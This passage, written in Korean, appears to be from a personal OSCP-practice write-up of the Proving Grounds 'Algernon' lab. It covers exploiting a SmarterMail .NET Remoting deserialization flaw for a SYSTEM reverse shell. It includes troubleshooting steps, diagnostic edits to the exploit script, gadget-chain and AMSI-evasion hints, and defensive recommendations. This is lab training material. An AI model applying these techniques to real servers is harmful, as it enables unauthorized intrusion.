**왜 이런 일이 생겼는가.** EDB 익스플로잇 제목이 `SmarterMail Build 6985 - Remote Code Execution`이고, 본문에 `SmarterMail before build 6985`라고 적혀 있음. "취약 상한선"을 "타겟 빌드"로 옮겨 적은 것.

**왜 위험했는가.** 6985를 그대로 믿었다면 —
- "패치 버전인데 왜 취약하지?" 하며 익스플로잇을 신뢰하지 못하고 다른 경로를 찾았을 것
- 또는 6919를 발견한 뒤 "6985가 아니네, 다른 CVE인가?" 하며 재조사에 들어갔을 것

**어떻게 잡았는가.** 독립 근거 3개를 모음 — ①런타임 JS 변수 ②정적 CSS 경로 ③디스크 바이너리 버전 리소스. ①②는 웹에서, ③은 셸에서 나왔으므로 완전히 다른 경로.

> [!danger] 일반화 — 버전은 항상 독립 근거 2개 이상
> 그리고 **누가 알려준 버전은 근거 0개.** 남의 정찰 결과·브리핑·팀원 메모는 출발점이지 사실이 아님.
> 특히 **익스플로잇 파일명/제목의 숫자를 타겟 버전으로 착각하는 실수**는 매우 흔함. `searchsploit`의 제목은 "이 버전 이하가 취약"을 뜻하는 경우가 대부분.
> 누적 사례: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] · **[[Algernon]]**

### ⑤ 9998인가 17001인가 — 두 정보원이 갈림

브리핑은 9998을, 개인 노트는 17001을 지목. **둘 다 열려 있었기 때문에 어느 쪽도 "틀렸다"고 배제할 수 없었음.**

**해소한 방법 — 프로토콜을 물음.**

| 질문 | 9998 | 17001 |
|---|---|---|
| `-sV` 판정은? | `http Microsoft HTTPAPI httpd 2.0` | `remoting MS .NET Remoting services` |
| 익스플로잇이 보내는 것은? | — | `.NET` 매직으로 시작하는 원시 TCP |
| HTTP로 말을 거는가? | 예 (`/interface/root` 리다이렉트) | 아니오 |

**익스플로잇 코드가 `PORT=17001`을 기본값으로 갖고 있다는 사실 자체가 결정적 증거.** 원본을 읽지 않고 IP만 바꿔 쏘는 습관이었다면 이 단서를 놓쳤을 것.

> [!tip] 일반화 — 정보원이 갈리면 "누가 맞나"가 아니라 "역할이 다른가"를 먼저 물을 것
> 하나의 제품이 **여러 포트를 서로 다른 목적으로** 여는 것은 매우 흔함. 웹 UI / API / 관리 RPC / 클러스터링 / 메트릭이 전부 다른 포트.
> **"둘 다 맞다"가 정답인 경우가 많음.** 그리고 익스플로잇 코드의 기본값은 그 자체로 정찰 정보.

### ⑥ 익스플로잇이 성공/실패를 알려주지 않음

`python3 exploit_algernon.py` → **출력 0줄, `EXIT=0`.** 스크립트는 `s.send(msg)` 후 `s.close()`가 전부.

**대응 절차 (이 유형을 만나면 그대로 따를 것)**

1. **발사 전에** 리스너가 붙어 있는지 `ss -lntp`로 확인
2. **발사 직후** 리스너 pane을 즉시 확인
3. **15~20초 대기.** 프로세스 생성 + TCP 왕복 시간이 필요함
4. 아무것도 없으면 → **원인 후보를 순서대로 제거**
   - 리스너가 진짜 그 포트인가 (①의 사고)
   - `LHOST`가 `tun0` IP인가
   - 페이로드가 1360바이트를 넘지 않았는가 (2-7절)
   - 아웃바운드 필터 — 포트를 80/443/53으로 바꿔본다
5. **스크립트에 진단을 직접 추가** — 이것이 가장 확실함

```python
# 원본 마지막 부분에 추가하면 최소한 "보냈다"는 사실은 확인된다
print(f'[+] payload len = {len(payload)}')
print(f'[+] uri = {uri}')
print(f'[+] sending {len(msg)} bytes to {HOST}:{PORT}')
s.send(msg)
print('[+] sent, closing')
s.close()
```

동시에 와이어에서도 확인.

```bash
sudo tcpdump -i tun0 -n "host 192.168.248.65 and (port 17001 or port 80)" -c 50
# 17001 로 나가는 SYN + 우리 80 으로 들어오는 SYN 이 둘 다 보여야 정상
```

> [!danger] 누적 패턴 — "응답이 성공을 뜻하지 않는다"
> [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] · **[[Algernon]]**
> Algernon은 이 패턴의 극단 — 잘못된 응답조차 없고, **아무 응답도 없음.** 성공 판정을 전적으로 부수 효과(리스너)에 위임해야 함.

### ⑦ `local.txt`를 찾느라 시간을 태울 뻔함

SYSTEM을 잡은 직후 `proof.txt`는 바로 나옴. 그런데 **`local.txt`가 없었음.** PG 박스는 보통 2개.

**함정.** "숨겨져 있겠지" 하고 `Get-ChildItem C:\ -Recurse -Filter local.txt`를 돌리기 시작하면 수 분에서 수십 분이 날아감. 그리고 ③의 사고처럼 명령이 조용히 깨지면 "돌았는데 없다"와 "안 돌았다"를 구분할 수도 없음.

**올바른 절차.** 전역 재귀 검색 이전에 표준 위치를 전수 확인.

```powershell
Get-ChildItem C:\Users -Directory | Select-Object -Expand Name          # 1) 사용자 목록 확정
Get-ChildItem C:\Users\<각 사용자>\Desktop -Force -ErrorAction SilentlyContinue  # 2) Desktop 전수, -Force 필수
```

두 단계로 **`local.txt`가 배치되지 않았다**는 결론이 나옴. 이 박스는 단일 플래그 박스.

> [!tip] 시험 반사 — 플래그가 안 보이면
> 1. **`-Force`/`dir /a`** 를 썼는가 (숨김 속성)
> 2. **모든 사용자 프로필**을 봤는가 — `C:\Users` 나열부터
> 3. `C:\Users\Public`, `C:\`, `%USERPROFILE%\Documents` 도 후보
> 4. **여기까지 실패한 뒤에야** 전역 재귀 검색
> 5. **그래도 없으면 "없다"가 답일 수 있음.** SYSTEM인데 안 보이면 정말로 없는 것 — 권한 문제가 아님
>
> [[Squid]]도 "플래그가 표준 위치에 없었다 + `-Recurse` 함정"으로 같은 곳에서 막힘.

### ⑧ 이 유형에서 흔히 막히는 지점 (이번 산출물에는 실측 기록이 없음 — 구분해 적음)

아래는 **이 박스에서 실제로 겪지 않음.** 같은 유형을 만났을 때의 대비로만 적음.

| 증상 | 원인 후보 | 대응 |
|---|---|---|
| 익스플로잇이 `ConnectionRefused` | 서비스 다운 / 이미 누가 크래시시킴 | 박스 리버트. 역직렬화 익스플로잇은 실패하면 서비스를 죽이는 일이 있음 |
| 첫 발사만 되고 재시도가 안 됨 | 가젯이 서비스 스레드를 망가뜨림 | 리버트 후 한 방에 성공하도록 준비를 끝내고 쏠 것 |
| `typeFilterLevel=Low` 라 델리게이트 가젯 거부 | 서버 구성 | `ExploitRemotingService`의 다른 기법 또는 다른 가젯 |
| 페이로드는 터졌는데 셸이 안 붙음 | AV/AMSI가 PowerShell 원라이너 차단 | `-enc`는 AMSI를 우회하지 못함. 다른 페이로드(`certutil` 다운로드 + 네이티브 바이너리)로 전환 |
| `.NET` 매직을 9998로 보냄 | 포트 혼동 | `400 Invalid Verb`가 돌아옴. 17001로 보낼 것 |

### ⑨ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 손절선 |
|---|---|---|
| 빠른 스캔 (10:59:00 → 10:59:01) | 1.3초 | — |
| 전수 스캔 (`-p-`, 208초) | 3.5분 | 백그라운드로 돌리고 기다리지 않음. 실제로 익스플로잇은 전수 스캔이 끝나기 전에 완료됨 |
| 제품/버전 식별 (9998) | 약 2분 | 10분. 넘어가면 다른 포트로 |
| 익스플로잇 확보·수정 (`searchsploit` → diff) | 약 1분 | 15분 |
| 리스너 준비 + 발사 + 셸 | 약 5분 | 20분. 넘으면 6-⑥ 절차로 원인 격리 |
| 플래그 확인 | 약 3분 | 10분. `local.txt` 전역 검색은 하지 않음 |
| 합계 | 약 10분 | 1시간 |

> [!tip] 이 박스에서 배우는 시간 관리 3원칙
> 1. **전수 스캔을 기다리지 마라.** 빠른 스캔(1.3초)으로 나온 포트에서 즉시 작업을 시작하고, `-p-`는 백그라운드에 둘 것. 이 박스는 실제로 전수 스캔이 끝나기 전에 SYSTEM을 잡음
> 2. **버전이 확정되면 그때 익스플로잇을 찾아라.** 순서를 뒤집으면 "익스플로잇에 맞는 버전을 찾는" 확증 편향에 빠짐 (④의 함정)
> 3. **인프라 준비에 5분 이상 쓰고 있다면 뭔가 잘못된 것.** 리스너 하나 띄우는 데 시간이 걸린다면 그건 도구 문제가 아니라 절차 문제 (①②)

---

## 7. OSCP 시험 관점

1. **`-p-`는 협상 대상이 아님.** 이 박스의 입구(17001)와 정보원(9998)이 둘 다 top-1000 밖. 전수 스캔 없이는 문제 자체가 보이지 않음. 대신 빠른 스캔을 먼저 돌려 병렬로 진행할 것.

2. **`nmap -sV`가 붙여주는 서비스 이름을 끝까지 읽어라.** `remoting MS .NET Remoting services`는 취약점 그 자체를 가리키는 이름이었음. 저레이트 `-sS` 스캔의 `unknown`/`distinct32`와 대조하면 `-sV`의 가치가 분명해짐.

3. **버전 판정은 독립 근거 2개 이상. 남이 준 버전은 근거 0개.** 익스플로잇 제목의 숫자는 취약 상한선이지 타겟 버전이 아님.

4. **EDB 스크립트는 허용, Metasploit은 1대 한정.** 판정 기준은 프레임워크 의존성이 있는가. 순수 Python + 표준 라이브러리로 단일 CVE를 찌르는 PoC는 허용됨. 결과가 같다면 Metasploit 카드는 반드시 아껴라.

5. **수동 대안을 항상 준비할 것.** EDB 스크립트가 없거나 안 맞으면 → `ysoserial.net`으로 `TypeConfuseDelegate` 체인 생성 + EDB 49216의 프레임 조립 코드(2-6절) 재사용. 이 조합이면 길이 제약도 사라짐.

6. **Windows 셸의 첫 명령은 `whoami`.** `nt authority\system`이면 4장이 없음. 다음이 `whoami /priv`, `whoami /groups`, `systeminfo`, `Win32_Service`. 리눅스 반사(`sudo -l`·`find -perm -4000`)는 전부 무용지물.

7. **서비스 계정이 권한상승의 유무를 결정.** `LocalSystem` → 끝. `LOCAL SERVICE`/`NETWORK SERVICE`/`IIS APPPOOL\*` → FullPowers + PrintSpoofer 경로([[Squid]]).

8. **성공 신호가 없는 익스플로잇은 부수 효과로 판정.** `EXIT=0`은 "파이썬이 안 죽었다"는 뜻뿐임. 리스너 · `tcpdump` · 스크립트에 직접 넣은 `print` 로 삼중 확인.

9. **인프라는 하나씩 만들고 즉시 검증할 것.** 리스너 여러 개를 한 번에 만들지 않음. `ss -lntp`의 LISTEN은 "포트가 열렸다"만 증명하고 "내가 보는 pane이 그 포트다"는 증명하지 않음.

10. **`pkill -f`를 `sudo`와 함께 쓰지 마라.** kill은 PID로. 패턴이 필요하면 `pgrep -af`로 먼저 눈으로 확인.

11. **경유 계층이 3개를 넘으면 인용부호로 싸우지 말고 인코딩·네이티브 cmdlet·파일로 도망갈 것.** 그리고 결과가 비었으면 명령이 실행됐는지부터 의심할 것.

12. **플래그가 없으면 정말 없을 수 있음.** SYSTEM으로 `-Force` 전수 확인까지 했다면 결론을 내리고 넘어갈 것. 전역 `-Recurse` 검색은 시간 폭탄.

13. **익명 FTP는 무조건 통째로 받아라.** 이 박스에서는 안 썼지만, `Spool`/`Logs` 안에 자격증명이 있는 구성은 흔함.

---

## 8. 방어 관점

| 조치 | 내용 |
|---|---|
| 패치 | SmarterMail을 빌드 6985 이상으로 올릴 것. 이 박스는 6919로 6년 이상 방치돼 있었음 |
| .NET Remoting 노출 차단 | 17001을 루프백 또는 관리 VLAN으로만 바인딩할 것. 관리 채널이 인터넷·사용자망에 열려 있을 이유가 없음 |
| `BinaryFormatter` 제거 | 신뢰 경계를 넘는 데이터에는 절대 쓰지 않음. `System.Text.Json`·`DataContractSerializer`(+`KnownTypes` 화이트리스트)로 대체. .NET 9부터는 아예 제거됨 |
| `typeFilterLevel=Low` | .NET Remoting을 당장 걷어낼 수 없다면 최소한 `Low`로 낮출 것. 델리게이트 계열 가젯이 차단됨 |
| 서비스 계정 최소권한 | `MailService`를 `LocalSystem`이 아닌 전용 저권한 계정으로 돌릴 것. 그것만으로 이 익스플로잇의 결과가 SYSTEM → 제한 계정으로 떨어지고, 공격자에게 권한상승 단계가 추가됨 |
| 익명 FTP 비활성화 | 메일 스풀·로그가 인증 없이 읽혀서는 안 됨. 최소한 `Logs`·`Spool` 디렉터리를 FTP 루트 밖으로 뺄 것 |
| 아웃바운드 이그레스 필터 | 서버가 임의 포트로 외부에 나가지 못하게 할 것. 이 공격은 리버스셸에 의존하므로 이그레스 차단만으로 실질적으로 무력화됨 |
| 80/tcp TRACE 비활성화 | 직접적인 위협은 아니나 `http-methods`에 잡힘. 불필요한 메서드는 끌 것 |

**우선순위 하나만 고른다면 — 서비스 계정 강등.** 패치는 벤더 일정에 묶이지만, `LocalSystem`을 저권한 계정으로 바꾸는 것은 오늘 할 수 있고 미지의 취약점에도 효과가 있음.

---

## 9. 참고 자료

- **CVE-2019-7214** — SmarterMail .NET Remoting deserialization RCE
- **EDB 49216** — `SmarterMail Build 6985 - Remote Code Execution` (author: 1F98D / original: Soroush Dalili). 로컬 사본: `~/PG/Algernon/49216.py`
- **NCC Group** — *Technical Advisory: Multiple Vulnerabilities in SmarterMail* (익스플로잇 헤더에 명시된 원 출처)
- **`ysoserial.net`** — .NET 가젯 체인 생성기. `TypeConfuseDelegate`가 이 박스가 쓰는 체인
- **`ExploitRemotingService`** — .NET Remoting 전용 공격 도구 (James Forshaw). EDB 스크립트가 안 통할 때의 대안
- **Microsoft Docs** — *BinaryFormatter security guide* / *Deserialization risks in .NET*
- **MS-NRTP / MS-NRBF** — .NET Remoting TCP 프로토콜 및 바이너리 직렬화 포맷 공식 명세. 2-6절 프레임 필드의 근거

---

## 남긴 흔적 (랩 정리용)

| 위치 | 내용 |
|---|---|
| 타겟 프로세스 | 익스플로잇이 띄운 `cmd.exe` → `powershell.exe` (리버스셸). 박스 리버트로 정리됨 |
| 타겟 로그 | SmarterMail `Logs` 디렉터리에 역직렬화 예외/연결 기록이 남았을 가능성 `[가정]` |
| Kali | `~/PG/Algernon/` — nmap 3종, gobuster 2종, `49216.py`(원본), `exploit_algernon.py`(수정본), `shell_session.log`, 스크린샷 |
| Kali tmux | `alg80` 세션 (SYSTEM 셸 유지 중). 정리: `tmux kill-session -t alg80` |
| 볼트 | `파일보관/PG-Algernon-smartermail-login.png` |

---

## 관련 노트

- [[Squid]] — Windows 박스, 서비스 계정(`LOCAL SERVICE`) → FullPowers → PrintSpoofer. **이 박스가 `LocalSystem`이 아니었다면 그 경로였음.** 인용 붕괴 함정도 공유
- [[Hawat]] — "출력 채널이 없는 익스플로잇"을 다루는 법. 인코딩으로 인용 우회
- [[Exfiltrated]] — base64로 인용 우회
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — **"응답이 성공을 뜻하지 않는다"** 누적 패턴
- [[Hub]] · [[Levram]] — **"버전 판정은 독립 근거 2개"** 누적 패턴
- [[_WRITEUP-STANDARD]] — 작성 표준
- [[_STATUS]] — 전수 진행현황
